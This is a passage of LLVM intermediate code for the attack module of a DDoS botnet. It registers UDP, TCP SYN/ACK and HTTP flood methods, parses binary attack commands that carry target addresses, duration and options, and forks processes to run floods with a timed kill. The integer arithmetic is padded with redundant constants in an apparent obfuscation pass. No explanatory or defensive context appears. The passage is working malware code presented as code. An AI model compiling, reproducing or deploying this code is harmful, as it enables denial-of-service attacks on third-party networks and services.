([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.255, i32 0, i32 0)], align 16
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table = common global [126 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -559038737, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_vse)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_plain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_syn)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_ack)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http)
  call void @add_attack(i8 zeroext 11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_stdhex)
  call void @add_attack(i8 zeroext 12, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_ovhhex)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = sub i32 0, 1
  %19 = sub i32 %17, %18
  %20 = add nsw i32 %17, 1
  %21 = sext i32 %19 to i64
  %22 = mul i64 %21, 8
  %23 = call i8* @realloc(i8* %15, i64 %22) #6
  %24 = bitcast i8* %23 to %struct.attack_method**
  store %struct.attack_method** %24, %struct.attack_method*** @methods, align 8
  %25 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %26 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %27 = load i8, i8* @methods_len, align 1
  %28 = add i8 %27, -104
  %29 = add i8 %28, 1
  %30 = sub i8 %29, -104
  %31 = add i8 %27, 1
  store i8 %30, i8* @methods_len, align 1
  %32 = zext i8 %27 to i64
  %33 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %26, i64 %32
  store %struct.attack_method* %25, %struct.attack_method** %33, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %21, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 3
  br i1 %4, label %5, label %27

; <label>:5:                                      ; preds = %2
  %6 = load i32, i32* %1, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %7
  %9 = load i32, i32* %8, align 4
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %5
  %12 = load i32, i32* %1, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %13
  %15 = load i32, i32* %14, align 4
  %16 = call i32 @kill(i32 %15, i32 9) #6
  br label %17

; <label>:17:                                     ; preds = %11, %5
  %18 = load i32, i32* %1, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %19
  store i32 0, i32* %20, align 4
  br label %21

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %1, align 4
  %23 = add i32 %22, -1488691695
  %24 = add i32 %23, 1
  %25 = sub i32 %24, -1488691695
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %1, align 4
  br label %2

; <label>:27:                                     ; preds = %2
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %251

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #7
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 0, 4
  %27 = add i64 %25, %26
  %28 = sub i64 %25, 4
  %29 = trunc i64 %27 to i32
  store i32 %29, i32* %4, align 4
  %30 = load i32, i32* %4, align 4
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %32, label %33

; <label>:32:                                     ; preds = %17
  br label %251

; <label>:33:                                     ; preds = %17
  %34 = load i8*, i8** %3, align 8
  %35 = getelementptr inbounds i8, i8* %34, i32 1
  store i8* %35, i8** %3, align 8
  %36 = load i8, i8* %34, align 1
  store i8 %36, i8* %7, align 1
  %37 = load i32, i32* %4, align 4
  %38 = sext i32 %37 to i64
  %39 = add i64 %38, -8205322239892930859
  %40 = sub i64 %39, 1
  %41 = sub i64 %40, -8205322239892930859
  %42 = sub i64 %38, 1
  %43 = trunc i64 %41 to i32
  store i32 %43, i32* %4, align 4
  %44 = load i32, i32* %4, align 4
  %45 = icmp eq i32 %44, 0
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %33
  br label %251

; <label>:47:                                     ; preds = %33
  %48 = load i8*, i8** %3, align 8
  %49 = getelementptr inbounds i8, i8* %48, i32 1
  store i8* %49, i8** %3, align 8
  %50 = load i8, i8* %48, align 1
  store i8 %50, i8* %8, align 1
  %51 = load i32, i32* %4, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 %52, 6555381130278399304
  %54 = sub i64 %53, 1
  %55 = add i64 %54, 6555381130278399304
  %56 = sub i64 %52, 1
  %57 = trunc i64 %55 to i32
  store i32 %57, i32* %4, align 4
  %58 = load i8, i8* %8, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %47
  br label %251

; <label>:62:                                     ; preds = %47
  %63 = load i32, i32* %4, align 4
  %64 = sext i32 %63 to i64
  %65 = load i8, i8* %8, align 1
  %66 = zext i8 %65 to i64
  %67 = mul i64 5, %66
  %68 = icmp ult i64 %64, %67
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %62
  br label %251

; <label>:70:                                     ; preds = %62
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i64
  %73 = call noalias i8* @calloc(i64 %72, i64 24) #6
  %74 = bitcast i8* %73 to %struct.attack_target*
  store %struct.attack_target* %74, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %75

; <label>:75:                                     ; preds = %125, %70
  %76 = load i32, i32* %5, align 4
  %77 = load i8, i8* %8, align 1
  %78 = zext i8 %77 to i32
  %79 = icmp slt i32 %76, %78
  br i1 %79, label %80, label %132

; <label>:80:                                     ; preds = %75
  %81 = load i8*, i8** %3, align 8
  %82 = bitcast i8* %81 to i32*
  %83 = load i32, i32* %82, align 4
  %84 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %85 = load i32, i32* %5, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 1
  store i32 %83, i32* %88, align 4
  %89 = load i8*, i8** %3, align 8
  %90 = getelementptr inbounds i8, i8* %89, i64 4
  store i8* %90, i8** %3, align 8
  %91 = load i8*, i8** %3, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 1
  store i8* %92, i8** %3, align 8
  %93 = load i8, i8* %91, align 1
  %94 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %95 = load i32, i32* %5, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %94, i64 %96
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %97, i32 0, i32 2
  store i8 %93, i8* %98, align 4
  %99 = load i32, i32* %4, align 4
  %100 = sext i32 %99 to i64
  %101 = sub i64 %100, -2473786703396464308
  %102 = sub i64 %101, 5
  %103 = add i64 %102, -2473786703396464308
  %104 = sub i64 %100, 5
  %105 = trunc i64 %103 to i32
  store i32 %105, i32* %4, align 4
  %106 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %107 = load i32, i32* %5, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %106, i64 %108
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %109, i32 0, i32 0
  %111 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %110, i32 0, i32 0
  store i16 2, i16* %111, align 4
  %112 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %113 = load i32, i32* %5, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %112, i64 %114
  %116 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %115, i32 0, i32 1
  %117 = load i32, i32* %116, align 4
  %118 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %119 = load i32, i32* %5, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %118, i64 %120
  %122 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %121, i32 0, i32 0
  %123 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %122, i32 0, i32 2
  %124 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %123, i32 0, i32 0
  store i32 %117, i32* %124, align 4
  br label %125

; <label>:125:                                    ; preds = %80
  %126 = load i32, i32* %5, align 4
  %127 = sub i32 0, %126
  %128 = sub i32 0, 1
  %129 = add i32 %127, %128
  %130 = sub i32 0, %129
  %131 = add nsw i32 %126, 1
  store i32 %130, i32* %5, align 4
  br label %75

; <label>:132:                                    ; preds = %75
  %133 = load i32, i32* %4, align 4
  %134 = sext i32 %133 to i64
  %135 = icmp ult i64 %134, 1
  br i1 %135, label %136, label %137

; <label>:136:                                    ; preds = %132
  br label %251

; <label>:137:                                    ; preds = %132
  %138 = load i8*, i8** %3, align 8
  %139 = getelementptr inbounds i8, i8* %138, i32 1
  store i8* %139, i8** %3, align 8
  %140 = load i8, i8* %138, align 1
  store i8 %140, i8* %9, align 1
  %141 = load i32, i32* %4, align 4
  %142 = sext i32 %141 to i64
  %143 = sub i64 %142, 4001623722728836532
  %144 = sub i64 %143, 1
  %145 = add i64 %144, 4001623722728836532
  %146 = sub i64 %142, 1
  %147 = trunc i64 %145 to i32
  store i32 %147, i32* %4, align 4
  %148 = load i8, i8* %9, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp sgt i32 %149, 0
  br i1 %150, label %151, label %243

; <label>:151:                                    ; preds = %137
  %152 = load i8, i8* %9, align 1
  %153 = zext i8 %152 to i64
  %154 = call noalias i8* @calloc(i64 %153, i64 16) #6
  %155 = bitcast i8* %154 to %struct.attack_option*
  store %struct.attack_option* %155, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %156

; <label>:156:                                    ; preds = %236, %151
  %157 = load i32, i32* %5, align 4
  %158 = load i8, i8* %9, align 1
  %159 = zext i8 %158 to i32
  %160 = icmp slt i32 %157, %159
  br i1 %160, label %161, label %242

; <label>:161:                                    ; preds = %156
  %162 = load i32, i32* %4, align 4
  %163 = sext i32 %162 to i64
  %164 = icmp ult i64 %163, 1
  br i1 %164, label %165, label %166

; <label>:165:                                    ; preds = %161
  br label %251

; <label>:166:                                    ; preds = %161
  %167 = load i8*, i8** %3, align 8
  %168 = getelementptr inbounds i8, i8* %167, i32 1
  store i8* %168, i8** %3, align 8
  %169 = load i8, i8* %167, align 1
  %170 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %171 = load i32, i32* %5, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %170, i64 %172
  %174 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %173, i32 0, i32 1
  store i8 %169, i8* %174, align 8
  %175 = load i32, i32* %4, align 4
  %176 = sext i32 %175 to i64
  %177 = add i64 %176, 2919293441383901153
  %178 = sub i64 %177, 1
  %179 = sub i64 %178, 2919293441383901153
  %180 = sub i64 %176, 1
  %181 = trunc i64 %179 to i32
  store i32 %181, i32* %4, align 4
  %182 = load i32, i32* %4, align 4
  %183 = sext i32 %182 to i64
  %184 = icmp ult i64 %183, 1
  br i1 %184, label %185, label %186

; <label>:185:                                    ; preds = %166
  br label %251

; <label>:186:                                    ; preds = %166
  %187 = load i8*, i8** %3, align 8
  %188 = getelementptr inbounds i8, i8* %187, i32 1
  store i8* %188, i8** %3, align 8
  %189 = load i8, i8* %187, align 1
  store i8 %189, i8* %12, align 1
  %190 = load i32, i32* %4, align 4
  %191 = sext i32 %190 to i64
  %192 = sub i64 %191, -4791265889827057942
  %193 = sub i64 %192, 1
  %194 = add i64 %193, -4791265889827057942
  %195 = sub i64 %191, 1
  %196 = trunc i64 %194 to i32
  store i32 %196, i32* %4, align 4
  %197 = load i32, i32* %4, align 4
  %198 = load i8, i8* %12, align 1
  %199 = zext i8 %198 to i32
  %200 = icmp slt i32 %197, %199
  br i1 %200, label %201, label %202

; <label>:201:                                    ; preds = %186
  br label %251

; <label>:202:                                    ; preds = %186
  %203 = load i8, i8* %12, align 1
  %204 = zext i8 %203 to i32
  %205 = sub i32 0, 1
  %206 = sub i32 %204, %205
  %207 = add nsw i32 %204, 1
  %208 = sext i32 %206 to i64
  %209 = call noalias i8* @calloc(i64 %208, i64 1) #6
  %210 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %211 = load i32, i32* %5, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %210, i64 %212
  %214 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %213, i32 0, i32 0
  store i8* %209, i8** %214, align 8
  %215 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %216 = load i32, i32* %5, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %215, i64 %217
  %219 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %218, i32 0, i32 0
  %220 = load i8*, i8** %219, align 8
  %221 = load i8*, i8** %3, align 8
  %222 = load i8, i8* %12, align 1
  %223 = zext i8 %222 to i32
  call void @util_memcpy(i8* %220, i8* %221, i32 %223)
  %224 = load i8, i8* %12, align 1
  %225 = zext i8 %224 to i32
  %226 = load i8*, i8** %3, align 8
  %227 = sext i32 %225 to i64
  %228 = getelementptr inbounds i8, i8* %226, i64 %227
  store i8* %228, i8** %3, align 8
  %229 = load i8, i8* %12, align 1
  %230 = zext i8 %229 to i32
  %231 = load i32, i32* %4, align 4
  %232 = add i32 %231, 707590250
  %233 = sub i32 %232, %230
  %234 = sub i32 %233, 707590250
  %235 = sub nsw i32 %231, %230
  store i32 %234, i32* %4, align 4
  br label %236

; <label>:236:                                    ; preds = %202
  %237 = load i32, i32* %5, align 4
  %238 = add i32 %237, -770069970
  %239 = add i32 %238, 1
  %240 = sub i32 %239, -770069970
  %241 = add nsw i32 %237, 1
  store i32 %240, i32* %5, align 4
  br label %156

; <label>:242:                                    ; preds = %156
  br label %243

; <label>:243:                                    ; preds = %242, %137
  %244 = call i32* @__errno_location() #7
  store i32 0, i32* %244, align 4
  %245 = load i32, i32* %6, align 4
  %246 = load i8, i8* %7, align 1
  %247 = load i8, i8* %8, align 1
  %248 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %249 = load i8, i8* %9, align 1
  %250 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %245, i8 zeroext %246, i8 zeroext %247, %struct.attack_target* %248, i8 zeroext %249, %struct.attack_option* %250)
  br label %251

; <label>:251:                                    ; preds = %243, %201, %185, %165, %136, %69, %61, %46, %32, %16
  %252 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %253 = icmp ne %struct.attack_target* %252, null
  br i1 %253, label %254, label %257

; <label>:254:                                    ; preds = %251
  %255 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %256 = bitcast %struct.attack_target* %255 to i8*
  call void @free(i8* %256) #6
  br label %257

; <label>:257:                                    ; preds = %254, %251
  %258 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %259 = icmp ne %struct.attack_option* %258, null
  br i1 %259, label %260, label %264

; <label>:260:                                    ; preds = %257
  %261 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %262 = load i8, i8* %9, align 1
  %263 = zext i8 %262 to i32
  call void @free_opts(%struct.attack_option* %261, i32 %263)
  br label %264

; <label>:264:                                    ; preds = %260, %257
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #6
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %22, label %19

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* %13, align 4
  %21 = icmp sgt i32 %20, 0
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19, %6
  ret void

; <label>:23:                                     ; preds = %19
  %24 = call i32 @fork() #6
  store i32 %24, i32* %14, align 4
  %25 = load i32, i32* %14, align 4
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %28

; <label>:27:                                     ; preds = %23
  call void @exit(i32 0) #8
  unreachable

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* %14, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %36

; <label>:31:                                     ; preds = %28
  %32 = load i32, i32* %7, align 4
  %33 = call i32 @sleep(i32 %32)
  %34 = call i32 @getppid() #6
  %35 = call i32 @kill(i32 %34, i32 9) #6
  call void @exit(i32 0) #8
  unreachable

; <label>:36:                                     ; preds = %28
  store i32 0, i32* %15, align 4
  br label %37

; <label>:37:                                     ; preds = %67, %36
  %38 = load i32, i32* %15, align 4
  %39 = load i8, i8* @methods_len, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp slt i32 %38, %40
  br i1 %41, label %42, label %73

; <label>:42:                                     ; preds = %37
  %43 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %44 = load i32, i32* %15, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %43, i64 %45
  %47 = load %struct.attack_method*, %struct.attack_method** %46, align 8
  %48 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %47, i32 0, i32 1
  %49 = load i8, i8* %48, align 8
  %50 = zext i8 %49 to i32
  %51 = load i8, i8* %8, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %50, %52
  br i1 %53, label %54, label %66

; <label>:54:                                     ; preds = %42
  %55 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %56 = load i32, i32* %15, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %55, i64 %57
  %59 = load %struct.attack_method*, %struct.attack_method** %58, align 8
  %60 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %59, i32 0, i32 0
  %61 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %60, align 8
  %62 = load i8, i8* %9, align 1
  %63 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %64 = load i8, i8* %11, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %61(i8 zeroext %62, %struct.attack_target* %63, i8 zeroext %64, %struct.attack_option* %65)
  br label %73

; <label>:66:                                     ; preds = %42
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* %15, align 4
  %69 = sub i32 %68, -2009437864
  %70 = add i32 %69, 1
  %71 = add i32 %70, -2009437864
  %72 = add nsw i32 %68, 1
  store i32 %71, i32* %15, align 4
  br label %37

; <label>:73:                                     ; preds = %54, %37
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %39

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %30, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %36

; <label>:14:                                     ; preds = %10
